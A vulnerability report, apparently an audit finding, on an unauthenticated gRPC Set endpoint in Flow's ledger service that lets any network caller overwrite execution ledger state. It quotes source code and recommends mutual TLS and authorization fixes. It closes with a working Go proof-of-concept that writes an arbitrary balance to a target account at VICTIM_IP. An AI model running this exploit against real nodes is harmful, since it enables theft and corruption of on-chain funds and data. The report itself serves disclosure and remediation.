### Title
Unauthenticated `LedgerService.Set` gRPC Endpoint Allows Arbitrary Execution Ledger State Corruption — (File: `ledger/remote/service.go`, `cmd/ledger/main.go`)

---

### Summary

The `flow-ledger-service` binary exposes a gRPC `LedgerService` that includes a `Set` RPC — a state-mutating operation that writes arbitrary key-value pairs directly into the execution ledger (the Merkle trie storing all Flow account balances, contract code, and storage). The gRPC server is instantiated with **no TLS credentials, no authentication interceptors, and no authorization checks**. Any network-reachable caller can invoke `Set` and permanently corrupt the execution ledger state. This is the direct analog to the Trust.sol vulnerability: instead of "blanket authority to any trusted account," the ledger service grants blanket authority to **every caller** — there is no access control at all on a privileged state-mutating interface.

---

### Finding Description

`cmd/ledger/main.go` creates the gRPC server with only message-size options:

```go
grpcServer := grpc.NewServer(
    grpc.MaxRecvMsgSize(int(*maxRequestSize)),
    grpc.MaxSendMsgSize(int(*maxResponseSize)),
)
```

No `grpc.Creds(...)`, no authentication interceptor, no authorization middleware is added. [1](#0-0) 

The service is then registered and bound to a TCP listener that the README explicitly documents as `0.0.0.0:9000`:

```go
ledgerServiceTCP = flag.String("ledger-service-tcp", "", "Ledger service TCP listen address (e.g., 0.0.0.0:9000)...")
``` [2](#0-1) [3](#0-2) 

The `LedgerService` proto defines a `Set` RPC that mutates ledger state:

```proto
rpc Set(SetRequest) returns (SetResponse);
``` [4](#0-3) 

The `Set` handler in `ledger/remote/service.go` performs only structural validation (non-nil state hash, non-empty keys, matching lengths) and then directly calls `s.ledger.Set(update)` — **no caller identity check, no role check, no token/credential check**:

```go
func (s *Service) Set(ctx context.Context, req *ledgerpb.SetRequest) (*ledgerpb.SetResponse, error) {
    // ... structural validation only ...
    newState, trieUpdate, err := s.ledger.Set(update)
``` [5](#0-4) 

Contrast this with the main Flow node admin server, which supports optional mutual TLS (`tls.RequireAndVerifyClientCert`) and whose gRPC backend is bound to a Unix socket (local-only by OS filesystem permissions):

```go
if node.AdminCert != NotSet {
    config := &tls.Config{
        MinVersion: tls.VersionTLS13,
        ClientAuth: tls.RequireAndVerifyClientCert,
        ...
    }
    opts = append(opts, admin.WithTLS(config))
}
``` [6](#0-5) [7](#0-6) 

The ledger service has no equivalent protection. The `adminHandler` for the ledger service is also unauthenticated plain HTTP with no credential check:

```go
func (h *adminHandler) handleCommand(w http.ResponseWriter, r *http.Request) {
    // only checks r.Method == POST, no auth
``` [8](#0-7) 

---

### Impact Explanation

The execution ledger is the authoritative Merkle trie storing all Flow account state: FLOW token balances, Cadence contract bytecode, and all account storage registers. A successful unauthenticated `Set` call can:

1. **Overwrite arbitrary account balances** — drain or inflate FLOW holdings for any address.
2. **Corrupt or replace Cadence contract code** — replace deployed contracts with malicious bytecode that will be executed by the FVM on the next block.
3. **Corrupt account storage registers** — destroy NFT ownership records, DeFi protocol state, or any on-chain data.

Because the ledger write is persisted to the WAL and the resulting new state hash is returned to the caller, the corruption propagates into subsequent execution results, receipts, and seals. Recovery requires a full node resync from a known-good checkpoint.

---

### Likelihood Explanation

The `cmd/ledger/README.md` documents and demonstrates binding to `0.0.0.0:9000` as the primary TCP usage example. There is no documentation requiring a firewall, VPN, or network-level isolation. Any attacker with TCP reachability to the execution node's ledger service port — including a malicious peer on the same data-center network, a compromised co-tenant, or any external attacker if the port is inadvertently exposed — can call `Set` with no credentials. The gRPC protocol is well-documented and client libraries exist in every major language, making exploitation trivial.

---

### Recommendation

1. **Require mutual TLS on the gRPC server** — add `grpc.Creds(credentials.NewTLS(tlsConfig))` with `ClientAuth: tls.RequireAndVerifyClientCert` to `grpcServer` in `cmd/ledger/main.go`, mirroring the pattern already used by the main admin server in `cmd/scaffold.go`.
2. **Add a gRPC authorization interceptor** — verify that the client certificate's identity matches a pre-configured allowlist (e.g., only the execution node's own identity) before dispatching any RPC, especially `Set`.
3. **Separate read and write RPCs** — expose `Get`/`GetSingleValue`/`HasState`/`Prove` on a separate listener or with weaker credentials; restrict `Set` to a dedicated, strongly-authenticated endpoint.
4. **Document the network isolation requirement** — if network-level isolation is the intended defense, enforce it in code (e.g., bind only to `127.0.0.1` or a Unix socket by default, requiring an explicit opt-in for TCP with mandatory TLS flags).

---

### Proof of Concept

```bash
# Attacker with network access to the ledger service TCP port
# No credentials required

cat > exploit.go << 'EOF'
package main

import (
    "context"
    "fmt"
    "google.golang.org/grpc"
    "google.golang.org/grpc/credentials/insecure"
    ledgerpb "github.com/onflow/flow-go/ledger/protobuf"
)

func main() {
    conn, _ := grpc.Dial("VICTIM_IP:9000",
        grpc.WithTransportCredentials(insecure.NewCredentials()))
    defer conn.Close()

    client := ledgerpb.NewLedgerServiceClient(conn)

    // 1. Fetch current initial state (no auth required)
    stateResp, _ := client.InitialState(context.Background(), nil)

    // 2. Write arbitrary value to any account register (no auth required)
    _, err := client.Set(context.Background(), &ledgerpb.SetRequest{
        State: stateResp.State,
        Keys: []*ledgerpb.Key{{
            Parts: []*ledgerpb.KeyPart{
                {Type: 0, Value: []byte("TARGET_ACCOUNT_ADDRESS")},
                {Type: 2, Value: []byte("balance")},
            },
        }},
        Values: []*ledgerpb.Value{
            {Data: []byte("999999999999999999")}, // arbitrary value
        },
    })
    fmt.Println("Set result:", err) // nil — no authentication error
}
EOF
go run exploit.go
```

The call succeeds because `grpc.NewServer(...)` in `cmd/ledger/main.go` carries no `grpc.Creds(...)` option and `ledger/remote/service.go`'s `Set` handler performs no caller identity verification before invoking `s.ledger.Set(update)`. [9](#0-8) [10](#0-9) [11](#0-10)

### Citations

**File:** cmd/ledger/main.go (L30-30)
```go
	ledgerServiceTCP    = flag.String("ledger-service-tcp", "", "Ledger service TCP listen address (e.g., 0.0.0.0:9000). If provided, server accepts TCP connections.")
```

**File:** cmd/ledger/main.go (L121-128)
```go
	grpcServer := grpc.NewServer(
		grpc.MaxRecvMsgSize(int(*maxRequestSize)),
		grpc.MaxSendMsgSize(int(*maxResponseSize)),
	)

	// Create and register ledger service
	ledgerService := remote.NewService(ledgerStorage, logger)
	ledgerpb.RegisterLedgerServiceServer(grpcServer, ledgerService)
```

**File:** cmd/ledger/README.md (L23-26)
```markdown
# Listen on TCP only
./flow-ledger-service \
  -triedir /path/to/trie \
  -ledger-service-tcp 0.0.0.0:9000
```

**File:** ledger/protobuf/ledger.proto (L9-28)
```text
// LedgerService provides remote access to ledger operations
service LedgerService {
  // InitialState returns the initial state of the ledger
  rpc InitialState(google.protobuf.Empty) returns (StateResponse);

  // HasState checks if the given state exists in the ledger
  rpc HasState(StateRequest) returns (HasStateResponse);

  // GetSingleValue returns a single value for a given key at a specific state
  rpc GetSingleValue(GetSingleValueRequest) returns (ValueResponse);

  // Get returns values for multiple keys at a specific state
  rpc Get(GetRequest) returns (GetResponse);

  // Set updates keys with new values at a specific state and returns the new state
  rpc Set(SetRequest) returns (SetResponse);

  // Prove returns proofs for the given keys at a specific state
  rpc Prove(ProveRequest) returns (ProofResponse);
}
```

**File:** ledger/remote/service.go (L132-198)
```go
// Set updates keys with new values at a specific state and returns the new state
func (s *Service) Set(ctx context.Context, req *ledgerpb.SetRequest) (*ledgerpb.SetResponse, error) {
	if req.State == nil || len(req.State.Hash) != len(ledger.State{}) {
		return nil, status.Error(codes.InvalidArgument, "invalid state")
	}

	if len(req.Keys) == 0 {
		return nil, status.Error(codes.InvalidArgument, "keys cannot be empty")
	}

	if len(req.Keys) != len(req.Values) {
		return nil, status.Error(codes.InvalidArgument, "keys and values length mismatch")
	}

	var state ledger.State
	copy(state[:], req.State.Hash)

	keys := make([]ledger.Key, len(req.Keys))
	for i, protoKey := range req.Keys {
		key, err := protoKeyToLedgerKey(protoKey)
		if err != nil {
			return nil, err // protoKeyToLedgerKey already returns status.Error
		}
		keys[i] = key
	}

	values := make([]ledger.Value, len(req.Values))
	for i, protoValue := range req.Values {
		var value ledger.Value
		// Reconstruct the original value type using is_nil flag
		// This preserves the distinction between nil and []byte{} that protobuf loses
		if len(protoValue.Data) == 0 {
			if protoValue.IsNil {
				// Original value was nil
				value = nil
			} else {
				// Original value was []byte{} (empty slice)
				value = ledger.Value([]byte{})
			}
		} else {
			// Non-empty value, use data as-is
			value = ledger.Value(protoValue.Data)
		}
		values[i] = value
	}

	update, err := ledger.NewUpdate(state, keys, values)
	if err != nil {
		return nil, status.Error(codes.InvalidArgument, err.Error())
	}

	newState, trieUpdate, err := s.ledger.Set(update)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}

	// Encode trie update using centralized encoding function to ensure
	// client and server use the same encoding method
	trieUpdateBytes := encodeTrieUpdateForTransport(trieUpdate)

	return &ledgerpb.SetResponse{
		NewState: &ledgerpb.State{
			Hash: newState[:],
		},
		TrieUpdate: trieUpdateBytes,
	}, nil
}
```

**File:** cmd/scaffold.go (L756-774)
```go
		if node.AdminCert != NotSet {
			serverCert, err := tls.LoadX509KeyPair(node.AdminCert, node.AdminKey)
			if err != nil {
				return nil, err
			}
			clientCAs, err := os.ReadFile(node.AdminClientCAs)
			if err != nil {
				return nil, err
			}
			certPool := x509.NewCertPool()
			certPool.AppendCertsFromPEM(clientCAs)
			config := &tls.Config{
				MinVersion:   tls.VersionTLS13,
				Certificates: []tls.Certificate{serverCert},
				ClientAuth:   tls.RequireAndVerifyClientCert,
				ClientCAs:    certPool,
			}

			opts = append(opts, admin.WithTLS(config))
```

**File:** admin/command_runner.go (L204-214)
```go
	listener, err := net.Listen("unix", r.grpcAddress)
	if err != nil {
		return fmt.Errorf("failed to listen on admin server address: %w", err)
	}

	opts := []grpc.ServerOption{
		grpc.MaxRecvMsgSize(r.maxMsgSize),
		grpc.MaxSendMsgSize(r.maxMsgSize),
	}

	grpcServer := grpc.NewServer(opts...)
```

**File:** cmd/ledger/admin.go (L48-62)
```go
func (h *adminHandler) handleCommand(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != http.MethodPost {
		h.writeError(w, http.StatusMethodNotAllowed, "method not allowed, use POST")
		return
	}

	var req adminRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.writeError(w, http.StatusBadRequest, fmt.Sprintf("invalid JSON: %v", err))
		return
	}

	h.logger.Info().Str("command", req.CommandName).Msg("received admin command")
```
